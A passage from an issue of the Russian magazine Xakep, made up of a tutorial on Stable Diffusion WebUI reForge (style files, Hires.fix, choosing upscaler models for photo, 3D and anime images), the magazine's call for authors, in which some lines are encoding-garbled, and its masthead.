  В настройках Stable Diffusion ты можешь захотеть кешировать модели
в памяти. По умолчанию в памяти хранится единственная модель, но если
количество RAM (именно RAM, не видеопамяти) позволяет, то можно уве‐
личить число кешируемых моделей.
   Кроме того, я рекомендую включить настройку Enable quantization in K
samplers, которая  оказывает малозаметный, но  статистически значимый
положительный эффект на качество генерации. Еще одна потенциально инте‐
ресная настройка — No norm в Emphasis mode. У меня она выключена; вклю‐
чать ее рекомендуется, когда на некоторых моделях в случайных генерациях
возникает абсолютно черная или сильно зашумленная картинка. Эта особен‐
ность была замечена в оригинальных моделях Animagine и Pony Diffusion; если
включить No norm, это меняет алгоритм вычисления весовых коэффициентов
токенов и, соответственно, меняет конечный результат. Поэтому у меня эта
настройка выключена.





Наконец, еще одна настройка, на сей раз — чисто визуальная: имеет смысл
уменьшить размер карточек в листинге базовых моделей и лор, который
открывается на вкладках Checkpoints и Loras. По умолчанию размер карточек
слишком велик, десятки моделей на экране не умещаются.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

           REFORGE
                УЛУЧШАЕМ КАРТИНКИ,
        ГЕНЕРИРУЕМЫЕ STABLE DIFFUSION





РАБОТА СО СТИЛЯМИ

В статье «Stable Diffusion XL. Выбираем модели, рефайнеры, лоры и стили» я
рассказывал, для чего нужны стили, что они собой представляют и как
работают. В приложении Fooocus есть ряд предустановленных стилей и даже
один динамический, использующий GPT-подобную языковую модель для рас‐
ширения запросов. В WebUI Forge предустановленных стилей нет, поэтому их
придется установить отдельно, скачав с GitHub или добавив самостоятельно.
   Стили из Fooocus, уже сконвертированные в нужный для A1111 формат,
можно скачать с GitHub.
   Тебе нужен файл styles.csv. Положи его в папку <путь к WebUI Forge>\
webui\, перезапусти WebUI и обнови окно браузера, если оно было открыто;
все новые стили должны подхватиться автоматически.





Ты можешь добавлять собственные стили как из веб‑интерфейса, так и пря‐
мым редактированием файла styles.csv. К примеру, если ты пользуешься
моделью Pony, то необходимые для работы модели теги можно прописать
в виде стиля (вопросительные знаки замени используемыми стилями — нап‐
ример, source_anime, source_cartoon или source_pony из документации
модели):


style_Pony,"score_9, score_8_up, score_7_up, score_6_up, score_5_up,
score_4_up, source_????, rating_????, BREAK {prompt}",

Обрати внимание на запятую в конце строки. Это не опечатка; после запятой
может идти строка с негативными ключевыми словами. В данном случае она
пуста.
  Я уже приводил собственный стиль Cinematic, он описывается следующей
строкой:


style_Cinematic,"photorealistic, cinematic, {prompt} . cinematic
angle, cinematic lighting, highly detailed, amazing, finely detailed,
 more realistic, Ultra HD 32k, cinematic, 4k, footage from an epic
movie, clear focus, detailed character design, ultra-high resolution,
 perfectly composed, UHD",

Интересная  особенность  WebUI:  если  ты  сгенерируешь  изображение,
использовав какой‑либо стиль, то при последующем открытии этой картинки
на вкладке PNG Info и переносе из нее параметров генерации в окно txt2img
программа  автоматически распознает стиль и подключит его. Впрочем,
это не сработает, если нужного стиля нет в списке или если ты отредак‐
тировал стиль после создания изображения.


HIRES.FIX: ГЕНЕРИРУЕМ КАРТИНКИ ВЫСОКОГО РАЗРЕШЕНИЯ

В интерфейс WebUI встроен мощный и удобный механизм, позволяющий
генерировать  картинки в разрешении, превышающем  стандартные  воз‐
можности Stable Diffusion. Да, ты можешь указать в параметрах генерации
выходное  разрешение  2048 ⨉  2048;  кстати,  попробуй  это  сделать
на каком‑нибудь простом запросе. Возьмем, например, запрос «a cat sitting
on a chair» и сгенерируем картинку в стандартном для SDXL разрешении 1024
⨉ 1024.





Ничего необычного. А теперь в качестве выходного разрешения укажем 2048
⨉ 2048.





Или другой пример. При генерации картинки в разрешении 1024 ⨉ 1024.





Указание при том же сиде выходного разрешения 2048 ⨉ 2048 выдаст уже
такую картинку.





А вот пример использования латентного апскейлера (да‑да, того самого,
который работает в латентном пространстве, но требует высокого коэффици‐
ента шумоподавления с высокими же мутациями).





Это происходит из‑за того, что Stable Diffusion XL обучена на изображениях,
разрешение которых не превышает один мегапиксель вне зависимости
от выбранного соотношения сторон. С переменным успехом ты можешь
попытаться растянуть рамки, но с удвоением разрешения нейросеть теряет
контекст, генерируя изображение по частям. В результате может получиться
кошка с двумя головами и шестью лапами — или и вовсе две кошки.
   Проблему можно решить разными способами. Один из них — исполь‐
зование инструмента под названием Hires.fix, который может поднять раз‐
решение оригинальной картинки до двух‑четырехкратного. Пример — ниже.





Не подумай, что это — что‑то подобное классическим методам увеличения
изображений вроде bicubic или Lanczos. Нет, механизм Hires.fix — это фак‐
тически второй проход генерации изображения, использующий ту же (или
любую другую по твоему выбору) базовую модель Stable Diffusion и тот же
(или другой, опять же — по твоему выбору) текстовый запрос.
   Помимо основной модели, механизм использует и специальную модель —
upscaler. Выбор этой модели  критически важен: некоторые апскейлеры
хорошо работают на реалистичных изображениях, подробно передавая тек‐
стуры, но заодно увеличивают и шумы, в том числе артефакты компрессии
JPEG. «Что‑что? — спросишь ты. — Откуда шумы и артефакты JPEG в сге‐
нерированных нейросетью изображениях?» Так ведь картинки, на которых
энтузиасты обучают кастомные модели, зачастую и являются такими вот
пережатыми джпегами...
   Побороть шумы и артефакты помогают модели апскейлеров, обученные
на зашумленных и пережатых картинках. Но в зависимости от выбранной
модели могут пострадать такие детали, как текстура тканей и кожи, шерсть
и прочее.
   Наконец, для изображений в стиле псевдо-3D, а также иллюстраций и кар‐
тинок в стиле аниме существуют свои алгоритмы, обученные на нужных дан‐
ных.
  В ближайшем будущем я планирую большую статью с обзором технологий
увеличения разрешения и сделанных на их основе моделей апскейлеров
для WebUI и не только. Сейчас же я опишу некоторые модели для разных
типов изображений.


Где брать модели
Ответ прост: на сайте openmodeldb.info. Однако WebUI поддерживает не все
представленные на сайте архитектуры. Среди поддерживаемых: ESRGAN,
ESRGAN+, Real-ESRGAN, DAT, DAT2, HAT, Swin-IR. При поиске можно выбрать
только модели поддерживаемых архитектур.


Что рекомендуют на Reddit и почему не стоит слепо доверять
рекомендациям
В тематических ветках на Reddit и других ресурсах, посвященных нейросетям,
нередко обсуждают вопрос о лучшей модели апскейлера для тех или иных
целей. Чаще  всего  пользователи рекомендуют для реалистичных изоб‐
ражений и R-ESRGAN 4x+ Anime6B для рисованных следующие модели:
 • 4x_foolhardy_Remacri;
 • 4x_NMKD-Siax_200k;
 • 4xUltrasharp_4xUltrasharpV10.

Эти модели — одни из лучших из имеющихся в рамках архитектур ESRGAN
и Real-ESRGAN соответственно. Проблема в том, что сами эти архитектуры
давно устарели. Да, они по‑прежнему работают, и ты по‑прежнему можешь их
использовать — но более современные архитектуры DAT (Dual Aggregation
Transformer for Image Super-Resolution) и HAT (Hybrid Attention Transformer for
Image Restoration) не просто выдадут картинку более высокого качества,
в чем мы убедимся несколько минут спустя, но еще и будут способны хорошо
увеличивать  изображения из более  широкого  диапазона, чем модели
на архитектуре ESRGAN. Упрощая, там, где модель на архитектуре ESRGAN
хорошо передаст либо структуру кожи, либо шерсть животного, либо гра‐
диенты, модель на архитектуре DAT сможет с большей вероятностью сделать
и то, и другое, и третье.


Новые модели в WebUI reForge
По сравнению с WebUI Forge, в форке reForge поддерживаются дополнитель‐
ные модели апскейлеров. В их число входят COMPACT, GRL, OmniSR, SPAN,
SRFormer. Из всего разнообразия новых архитектур для высококачественного
апскейла лучше всего подойдет SRFormer; в качестве модели могу пореко‐
мендовать 4xNomos8kSCSRFormer.
   Остальные модели достаточно легковесны и лучше подойдут для повыше‐
ния разрешения у видеороликов, чем у статичных изображений высокого раз‐
решения.


Информации о моделях, их архитектуре и различиях между ними — буквально
крохи. Их нужно собирать из разных источников, из скудных описаний самих
моделей и опубликованных исследовательских работ. Время от времени раз‐
работчики моделей апскейлеров пишут о них на Reddit, но практически всег‐
да в форме коротких рекомендаций без каких‑либо объяснений. В то же вре‐
мя в сети достаточно ресурсов, на которых сравниваются результаты работы
самых разных моделей апскейлеров.


        WWW

                        Большая галерея — сравнение нескольких десят‐
                        ков моделей апскейлеров


Я протестировал несколько десятков моделей множества архитектур и оста‐
новился на нескольких.


Для иллюстраций, аниме и изображений в стиле штриховой
графики
Для простых двумерных картинок часто рекомендуют старый, зато очень быс‐
трый и нетребовательный к объему видеопамяти алгоритм R-ESRGAN 4x+
Anime6B (технология Real-ESRGAN) — который, что надо учитывать, заодно
поднимает резкость, контраст и насыщенность изображения. Я рекомендую
этот алгоритм только для двумерных картинок в «цифровом» стиле, в которых
нет имитации мелков, восковых карандашей, чернил или туши; нет никаких
текстур, но есть четкие контуры и плавные градиенты.
   Если же такие элементы присутствуют, то я предпочитаю более щадящий
алгоритм 4x_IllustrationJaNai_V1_DAT2_190k (архитектура DAT2), который сох‐
раняет не только сами штрихи, но и текстуры и степень нажима, если речь
идет о  рисунках  мелками.  Алгоритмы Real-ESRGAN  имеют  тенденцию
«съедать» такие детали, выдавая контрастные, «глянцевые» версии изоб‐
ражений.


Для псевдореалистичных изображений и графики в стиле 2.5D
и 3D
Как правило, в таких изображениях отсутствуют шумы, артефакты сжатия
JPEG и тонкие нерегулярные текстуры, но присутствуют переходы цветов
и градиенты. Соответственно, нет необходимости поднимать контурную рез‐
кость и бороться с артефактами и сохранять текстуры, а если такая необ‐
ходимость и возникнет — используй модель для реалистичной графики.
  Для графики такого типа можно рекомендовать один из алгоритмов
на основе архитектур DAT, DAT2 (облегченная версия DAT) или HAT, нап‐
ример 4xNomos8kSCHAT-L (также прекрасно работает с реалистичной гра‐
фикой), 4xNomos8kDAT или 4xNomosUniDAT2_box. Если в сгенерированных
картинках при увеличении видны артефакты JPEG, то стоит использовать вер‐
сии   otf,   обученные  на   сжатых   изображениях, —  4xLexicaDAT2_otf
или 4xNomosUniDAT_bokeh_jpg.


Для фотореалистичных изображений
«Фотографические» модели обучают на кадрах из фильмов и реальных
фотографиях, на которых встречаются как шумы (цифровой и пленочный), так
и артефакты компрессии. Соответственно, в некоторых случаях нейросеть
может генерировать изображения с такими шумами; артефакты компрессии
могут присутствовать лишь в некоторых участках изображения. Предугадать
появление артефактов тяжело; это зависит лишь от того, на каком материале
обучалась модель, — или от того, какие именно обученные модели исполь‐
зовал автор модели‑ремикса.
  По результатам длительного тестирования я остановился на нескольких
моделях: 4xNomos8kSCHAT-L или 4xNomos8kDAT для изображений без арте‐
фактов     компрессии    и     4xNomos8kHAT-L_otf    или     свежей
модели 4xRealWebPhoto_v4_dat2 — для картинок, которые нужно почистить
от артефактов. При этом модель 4xNomos8kSCHAT-L имеет тенденцию прив‐
носить излишнюю резкость и двоения в зону размытия; если этот эффект
нежелателен, используй другую модель. Обрати внимание на перила в пра‐
вом нижнем углу изображения.





Сравни с работой модели 4xNomos8kDAT.





Для котиков и портретов отлично подходит 4xFaceUpDAT (архитектура DAT),
который замечательно передает фактуру шерсти и волос, но имеет тен‐
денцию превращать в шерсть и волосы все, что хоть немного их напоминает
(например, траву на лужайке). Модель 4xFaceUpSharpDAT даст дополнитель‐
ную контурную резкость при меньшей фактической детализации картинки.
  В сухом остатке:
 • для качественных моделей + фотореализм: 4xNomos8kSCHAT-L (самая
   резкая и одновременно детализированная модель, но обрати внимание
   на  зону  размытия —  в  ней  может  возникнуть  эффект  двоения)
   либо 4xNomos8kDAT;
 • для котиков и лицевых портретов: 4xFaceUpDAT (держим в уме, что модель
   имеет потенциал превращать в волосы все, отдаленно на них похожее);
 • для фотореалистичных изображений с артефактами компрессии JPEG:
   4xNomos8kHAT-L_otf или 4xRealWebPhoto_v4_dat2;
 • для  псевдо-3D  и  синтетических  изображений  без  тонких  текстур:
   4xNomos8kSCHAT-L, 4xNomos8kDAT, 4xNomosUniDAT2_box;
 • для    иллюстраций   и    сложных    картинок   в    стиле    аниме:
   4x_IllustrationJaNai_V1_DAT2_190k;
 • для простой графики и «плоских» аниме‑изображений: R-ESRGAN 4x+
   Anime6B (внимание: алгоритм увеличивает резкость, контраст и насыщен‐
   ность изображения) или одну из моделей на основе ESRGAN, нап‐
  ример      4x_BooruGan_650k-ESRGAN,      4x_fatal_Anime_500000_G
   или NMKD_SuperYandere_175k.


ГАЛЕРЕЯ

Чтобы не быть голословным, выкладываю галереи, иллюстрирующие работу
различных моделей и архитектур.





           4xNomos8kSCHAT-L, 4xNomos8kDAT, 4xFaceUpDAT





          4xNomosUniDAT2_box, DAT_2_x4, 2x_SwinIR-M_x2_GAN





          2x_SwinIR-M_x2_GAN, 4xNomosUniDAT2_box, DAT_2_x4





             4x-nomos8k-dat, 4xFaceUpDAT, 4x-Nomos8k-schat-l

Рекомендую анализировать увеличенные версии изображений. Различия
между моделями особенно четко проявляются на шерсти, волосах, текстуре
платья и коже лица.


ПРОДОЛЖЕНИЕ СЛЕДУЕТ

В этой статье я описал лишь самые азы работы с WebUI. Прочитав ее, ты смо‐
жешь сделать начальные настройки и сгенерировать первые удачные изоб‐
ражения, избежав ошибок новичков.
   Однако возможности WebUI не ограничены описанным. В следующих
статьях я планирую подробно рассказать об особенностях моделей повыше‐
ния разрешения, о разнице между семплерами и шедулерами, о значении
параметра CFG и механизмах, позволяющих справиться с избыточным кон‐
трастом при его повышении за пределы средних значений.
    Хочется поговорить и об инструменте для автоматического исправления
лиц и рук, использующем дополнительные модели для анализа изображений,
поиска нужных элементов и их тщательной отрисовки в повышенном раз‐
решении.
  И разумеется, хочется разобраться с системой Control Net, которую мно‐
гие считают краеугольным камнем Stable Diffusion и которая позволяет соз‐
давать полноценные изображения на основе нарисованных от руки скетчей.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №7 (304)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
               Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                          Евгения Шарипова           yambuto
                            Литературный редактор          Бильд‑редактор
                                                   yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий‑Стем‐
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы о подписке:        ​Вопросы о материалах:
                                 lapina@glc.ru                support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024